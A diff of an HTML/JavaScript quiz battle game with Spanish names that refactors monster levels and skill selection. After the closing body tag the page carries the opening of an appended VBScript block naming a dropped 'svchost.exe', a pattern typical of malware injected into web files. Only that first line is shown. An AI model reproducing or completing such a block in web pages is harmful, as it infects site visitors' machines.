@@ -8,7 +8,7 @@
 <body id="battle"><audio src="audio/FinalFantasyIV.mp3" autoplay="autoplay" loop="loop">d</audio>
 	<main id="main">
 		<div id="poder" style="padding: 10px;"></div>
-	<div id="puntuacion">
+	<div id="puntuacion" style="display: none;">
 		<h2 style="text-align: center;"><span style="color: red">NIVEL <span id="nivelShow"></span></span> SUPERADO</h2>
 		<hr>
 		<ul style="list-style: none;" class="listaPunt">
@@ -19,16 +19,16 @@
 		<ul>
 			<h2 style="text-align: center;">ELIGE</h2>
 			<hr>
-			<div >
+			<div id="habilidadPotenc">
 				<ul id="habilidadesNuevas">
 					
 				</ul>
 			</div>
 	</div>
-	
+
+<div id="Pdaño"></div>	
 	<div class="boss" id="boss">
-		<img src="Imagen2.png">
-		<div id="Pdaño"></div>
+				
 	</div>
 	
 <div class="control" id="control">
@@ -79,48 +79,6 @@
 <script type="text/javascript" src="js/sistem.js"></script>
 <script type="text/javascript" src="js/habilidades.js"></script>
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
-
-<script type="text/javascript">
-	$(this).find('button')[0] = document.activeElement;
-		 $(".control").keydown(function (e) {
-	 	console.log(e.which);
-  var items = $(this).find('button'),
-  activo = document.activeElement;
-  
-  if (e.which == 39) {
-    //ciclo for que valida si NO es el último 
-    for (var i = 0; i < items.length - 1; i++) {
-      if(activo === items[i]){
-        items[i + 1].focus();
-      }
-    }
-  }
-  if (e.which == 37) {
-    //ciclo for que valida si NO es el primero
-    for (var i = 1; i < items.length; i++) {
-      if (activo === items[i]) {
-        items[i - 1].focus();
-      }
-    }
-  }
-  if (e.which == 38) {
-    //ciclo for que valida si NO es el primero
-    for (var i = 2; i < items.length; i++) {
-      if (activo === items[i]) {
-        items[i - 2].focus();
-      }
-    }
-  }
-    if (e.which == 40) {
-    //ciclo for que valida si NO es el primero
-    for (var i = 0; i < items.length; i++) {
-      if (activo === items[i]) {
-        items[i + 2].focus();
-      }
-    }
-  }
-});
-</script>
 <script type="text/javascript">
 
 	
@@ -134,12 +92,15 @@
 		const vidaMaxima          = document.getElementById('vidaMaximaM');
 		const vidaMaximaP         = document.getElementById('vidaMaximaP');
 		const contadorP           = document.getElementById('contadorP');
+		const contadorM           = document.getElementById('contadorM');
 		const poder               = document.getElementById('poder');
 		const monto               = document.getElementById('monto');
 		const montop              = document.getElementById('montoP');
 		const boss                = document.getElementById('boss');
 		const nameMonster         = document.getElementById('nameMonster');
 		const contenedorMagia     = document.getElementById('contenedorMagia');
+		const battle     = document.getElementById('battle');
+
 		
 		var magia      			  = document.getElementById('Magia');
 		var puntuacion			  = document.getElementById('puntuacion');
@@ -152,14 +113,13 @@
 		var respuestasCorrectas   = document.getElementById('respuestasCorrectas');
 		var habilidadesNuevas  	  = document.getElementById('habilidadesNuevas');
 
-
-		
+		var nivelAventura 		  = 0;
+		var puntn 				  = 0;
 		var respuestasIncorrect   = 0;
 		var respuestasCorrect	  = 0;
 		var PreguntasTotal		  = 0;
-		var nivelAventura         = 0;
 		var pp                    = 0;
-	
+		var r = false;
 			
 
 
@@ -172,6 +132,7 @@
 	class personaje{
 		constructor(){
 			this.monstruo = new monstruo();
+			this.habilidadespas = [];
 			this.estadisticas = {
 				habilidades:{
 				'normal':1,
@@ -182,8 +143,8 @@
 				'quemadura':6,
 				'loco':7,
 			},
-				fuerza:20,
-				fuerzaMagica:1,
+				fuerza:10,
+				fuerzaMagica:3,
 				defensa:3,
 				maxvit:15,
 				vit:15,
@@ -193,15 +154,15 @@
 		}	
 		
 		
-		fuerzaDeAtaque(tipodeataque, vidaActual){
-			this.monstruo.estadisticas.vit = vidaActual;
+		fuerzaDeAtaque(tipodeataque, vidaActual, defensaMonstruo, defensaMagicaMonstruo){
+		
 			let music;
+			console.log(defensaMonstruo);
 			if (tipodeataque == 'normal') {
 				music = new Audio('sound/strike02.wav');
 				music.play();
 				music.playbackRate = 2;
-				
-				return Math.round((this.estadisticas.habilidades.normal * this.estadisticas.fuerza) / this.monstruo.estadisticas.defensa);
+				return Math.round((this.estadisticas.habilidades.normal * this.estadisticas.fuerza) / defensaMonstruo);
 			}
 			else{
 				pp -= tipodeataque;
@@ -212,11 +173,11 @@
 				music.play();
 				music.playbackRate = 2;
 				ppShow.innerHTML = pp;
-				return Math.round((tipodeataque + this.estadisticas.fuerzaMagica) / this.monstruo.estadisticas.defensaMagica);
+				return Math.round((tipodeataque + this.estadisticas.fuerzaMagica) / defensaMagicaMonstruo);
 			}
 		}
-		dañoPersonaje(ataqueMonstruo){
-				this.estadisticas.vit -= Math.round((ataqueMonstruo + this.monstruo.estadisticas.fuerza) / this.estadisticas.defensa) ;
+		dañoPersonaje(ataqueMonstruo, fuerzaMonstruo){
+				this.estadisticas.vit -= Math.round((ataqueMonstruo + fuerzaMonstruo) / this.estadisticas.defensa) ;
 				return [this.estadisticas.vit, this.porcentajePoder(this.estadisticas.vit)];
 			
 		}
@@ -228,52 +189,51 @@
 
 	//monstruo
 	class monstruo{
-		constructor(enemigo){
-			this.enemigo = enemigo;
-			this.name = 'Croco';
-			this.png = 'Imagen2.png';
-			this.poderes = [
-			{'PLACAJE':2}, 
-			{'DESTRUCCION':6},
-			 {'ASESINO':10}, 
-			 {'TORNADO':14}, 
-			 {'M':12}, 
-			 {'S':16}, 
-			 {'7':20}];
+		constructor(){
+			this.enemigo = nivel[0];
 			this.random = function() {
 				return Math.round(Math.random()*(0-6) + 6);
-			} 
-			this.estadisticas = {
-				vitMaxima:10,
-				vit:10,
-				minVit:0,
-				fuerza:3,
-				defensa:2,
-				defensaMagica:1
 			}
+		
 		}
 		 ataque() {	
-		 	console.log(this.enemigo.name);
-			return this.estadisticas.vit;
+			return this.enemigo.estadisticas.vit;
 		}
 		vitalidades(vidaActual){
-			this.estadisticas.vit = vidaActual;
+			this.enemigo.estadisticas.vit = vidaActual;
 		}
 		randomPower(){
-			return this.poderes[this.random()];
+			return this.enemigo.poderes[this.random()];
 		}
 		niveldeataque(nivel, vidaActual){
-				return (vidaActual * 100) / this.estadisticas.vitMaxima + '%';
+				return (vidaActual * 100) / this.enemigo.estadisticas.vitMaxima + '%';
 			
 		}
+		vistas(){
+		vidaMaxima.innerHTML = this.enemigo.estadisticas.vit;
+		boss.innerHTML = "<img src = '"+this.enemigo.png+"'>";
+		vidaMaximaP.innerHTML = cont1.estadisticas.maxvit;
+		vidaMaxima.innerHTML = this.enemigo.estadisticas.vit;
+		contadorP.innerHTML = cont1.estadisticas.vit;
+		nameMonster.innerHTML = this.enemigo.name;
+		controlVida.style.margin = '70px;';
+		contadorM.innerHTML = this.enemigo.estadisticas.vit;
+		monto.style.width = "100%";
+		battle.style.background = "url('"+this.enemigo.back+"')";
+		battle.style.backgroundPosition = "100%;";
+		battle.style.backgroundRepeat = "no-repeat";
+		battle.style.backgroundSize = "100%";
+		}
+		
 	}	
 
 		//instancias
-		var cont  = new monstruo(nivel[0]);
+	
+		var cont  = new monstruo();
 		var cont1 = new personaje();
 		var song = new Audio('audio/battle1.mp3');
-				song.loop = true;
-				song.playbackRate = 2;
+		song.loop = true;
+		song.playbackRate = 2;
 		//nivel
 
 //controles
@@ -284,8 +244,7 @@
   			song.pause();
 		}
 		function controles() {
-			nameMonster.innerHTML = cont.name;
-			controlVida.style.margin = '70px;';
+		
 			controlHabilidad.style.display = 'none';
 			contenedorPreguntas.style.display = 'block';
 			contenedorMagia.style.display = "none";
@@ -293,17 +252,19 @@
 			var rp = randomAnsw(0, ps); 
 			mamas(rp);
 		}
+
 			function hechizo(e, r) {
 				var counter = cont.ataque();	
 				var ataqueMagico = r;
-				counter -= cont1.fuerzaDeAtaque(ataqueMagico, counter);
-				monto.style.width = cont.niveldeataque(ataqueMagico, counter); 
+				counter -= cont1.fuerzaDeAtaque(ataqueMagico, counter, cont.enemigo.estadisticas.defensa,cont.enemigo.estadisticas.defensaMagica);
+				monto.style.width = cont.niveldeataque(ataqueMagico, counter, cont.enemigo.estadisticas.defensa,cont.enemigo.estadisticas.defensaMagica); 
 				Pdaño.style.opacity = 1;
-				Pdaño.style.top = "0px";
-				Pdaño.innerHTML = cont1.fuerzaDeAtaque(ataqueMagico, counter);
+				Pdaño.style.top = "50px";
+
+				Pdaño.innerHTML = cont1.fuerzaDeAtaque(ataqueMagico, counter, cont.enemigo.estadisticas.defensa,cont.enemigo.estadisticas.defensaMagica);
+				console.log(cont1.fuerzaDeAtaque(ataqueMagico, counter, cont.enemigo.estadisticas.defensa,cont.enemigo.estadisticas.defensaMagica));
 				setTimeout(function () {
-					Pdaño.style.top = "10px";
-					Pdaño.style.opacity = 0;
+					Pdaño.style.top = "70px";
 					Pdaño.style.opacity = 0;
 					nivelShow.innerHTML = nivelAventura +1;
 					PreguntasEnTotal.innerHTML = PreguntasTotal;
@@ -312,26 +273,33 @@
 				
 				}, 1000);
 				
-				if (counter <= cont.estadisticas.minVit) {
+				if (counter <= cont.enemigo.estadisticas.minVit) {
 					monto.style.width = '0';
 					boss.style.opacity = 0;
-					counter = cont.estadisticas.minVit;
-					control.style.display = 'none';
-					setTimeout(function(){
-						puntuacion.style.top = "150px";
-						puntuacion.style.opacity = 1;
-					}, 3000)
+				
 							
 								
 				pauseAudio();
 				boss.style.top = "190px";
 				song = new Audio('audio/FinalFantasyIV.mp3');
 				song.loop = true;
+
+
+					counter = cont.enemigo.estadisticas.minVit;
+					control.style.display = 'none';
+					puntuacion.style.display = "block";
+					setTimeout(function(){
+						puntuacion.style.top = "50px";
+						puntuacion.style.opacity = 1;
+						boss.style.top = "100px";
+						boss.style.display = "none";
+						
+					}, 3000);
 				}	
 				document.getElementById('main').className = 'white';
-				let vitalidadJefe = document.getElementById('contadorM').innerHTML = counter;
+				let vitalidadJefe = contadorM.innerHTML = counter;
 			
-			cont.estadisticas.vit = counter;	
+			cont.enemigo.estadisticas.vit = counter;	
 				controles();
 			
 			}
@@ -356,9 +324,6 @@
 				
 			}
 		}
-
-	
-
 		function mamas(rp){
 			music();
 			var keys = Object.keys(preguntas[rp].respuestas);
@@ -366,20 +331,20 @@
 			for (let i = 0; i < keys.length-1; i++) {
 				ulRespuestas.innerHTML += "<button value= '"+ preguntas[rp].respuestas[i] + "'class = 'respuestas' onclick = 'delet(this,"+rp+");' id = 'respuestaDefinitiva"+i+"' >" + preguntas[rp].respuestas[i] +"</button>";
 		}
+	}	
 		
-	
-	}
-  			
+		
+
 	window.onload = function(){	
+	
+		
+		cont.vistas();
 		controles();	
 	PoderAdicional(habilidades);
 //combate
+		var atacar = document.getElementById('atacar');
 		var counter = cont.ataque();
 		var iniciovit = document.getElementById('contadorM').innerHTML = counter;
-		vidaMaximaP.innerHTML = cont1.estadisticas.vit;
-		vidaMaxima.innerHTML = cont.estadisticas.vit;
-		var atacar = document.getElementById('atacar');
-		contadorP.innerHTML = cont1.estadisticas.vit;
 		magia.addEventListener('click', function () {
 			habilidadesPersonaje();
 			contenedorMagia.style.display = "block";
@@ -420,24 +385,19 @@
 				let s= new Audio('Sound/damage1.wav');
 				s.play();
 				s.playbackRate = 2;
-				
 				let p = cont.randomPower();
-				daño = cont1.dañoPersonaje(Object.values(p)[0])[0];
+				daño = cont1.dañoPersonaje(Object.values(p)[0], cont.enemigo.estadisticas.fuerza)[0];
 				poder.innerHTML = Object.keys(p);
 				setTimeout(function () {
 					controlAtaque();
 						}, 3000);
-				
 				poder.style.opacity = 1;
-
 				montop.style.width = cont1.porcentajePoder(daño) + "%";
 				document.getElementById('main').className = 'red';
 				let music;
-					if (daño <= cont1.estadisticas.minVit) {
-						
+					if (daño <= cont1.estadisticas.minVit) {	
 						daño = 0;
 						montop.style.width = "0%";
-						
 						setTimeout(function () {
 							music = new Audio('sound/FCƒGƒtƒFƒNƒgOFF.WAV');
 							music.play();
@@ -464,16 +424,31 @@
 		
 		
 		function PoderAdicional(Pasiva){
+			
 			for (var i = 0; i <= Pasiva.length -1; i++) {
-				habilidadesNuevas.innerHTML += "<li><button onclick= 'rsa()'>" + Pasiva[i].Nombre + "</button><span> " +Pasiva[i].detalles +"</span></li>"
+				habilidadesNuevas.innerHTML += "<li><button onclick= 'rsa(this,1, "+ Pasiva[i].habilidad+")'>" + Pasiva[i].Nombre + "</button><span> " +Pasiva[i].detalles +"</span></li>"
 	
 
 			}
 		}
-		function rsa(){
-			console.log("asdads");
-		}
-		var rs = [];
+		function rsa(e,l,s){
+			 s();
+			l++;
+			puntuacion.style.opacity = 0;
+			setTimeout(function(){
+				puntuacion.style.top = "0";
+				nivelAventura += (l -1);
+				cont.enemigo = nivel[nivelAventura];
+				cont.vistas();
+				boss.style.display = "block";
+				control.style.opacity = 1;
+				control.style.display = "flex";	
+				boss.style.opacity = 1;
+		}, 2000);
+		}	
+	
+		
+	
 </script>
 </body><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
